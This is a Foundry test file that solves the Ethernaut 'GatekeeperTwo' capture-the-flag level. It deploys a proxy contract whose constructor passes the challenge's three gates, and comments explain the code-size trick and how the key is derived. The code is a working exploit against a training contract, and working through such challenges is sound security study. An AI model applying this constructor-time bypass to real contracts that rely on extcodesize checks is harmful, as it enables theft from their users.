// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

// they keep going at checking tx.origin
// down with the middleman then
interface IFactory {
  function createInstance(address _player) external payable returns (address);
  function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IGatekeeperTwo {
  function enter(bytes8) external returns (bool);
}

contract Proxy {
  constructor(address _challengeAddress) {
    IGatekeeperTwo challenge = IGatekeeperTwo(_challengeAddress);
    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;

    challenge.enter(key);
  }
}

contract GatekeeperTwoTest is Test {
  IFactory internal challengeFactory;
  address internal challengeAddress;

  function setUp() public {
    // As we are not using the utils library, we need to fork here.
    vm.createSelectFork(vm.envString("RPC_URL"), vm.parseUint(vm.envString("BLOCK_NUMBER")));
    challengeFactory = IFactory(0xC0aB043d0585e15a9357304125CB674CF7623B6c);
    challengeAddress = challengeFactory.createInstance(tx.origin);
  }

  function testExploit() public {
    // gateOne
    //   need a proxy
    //
    // gateTwo
    //   needs the functionality to be executed from
    //   the proxy's constructor.
    //   a contract has its extcodesize defined
    //   after construction.
    //
    // gateThree
    //   if Constant ^ key = 0xff
    //   then key = 0xff ^ constant
    //   notice that they are checking against msg.sender,
    //   so compute the key at the proxy


    // attack being performed at the construction of the contract
    Proxy proxy = new Proxy(challengeAddress);
    proxy;

    require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
  }
}
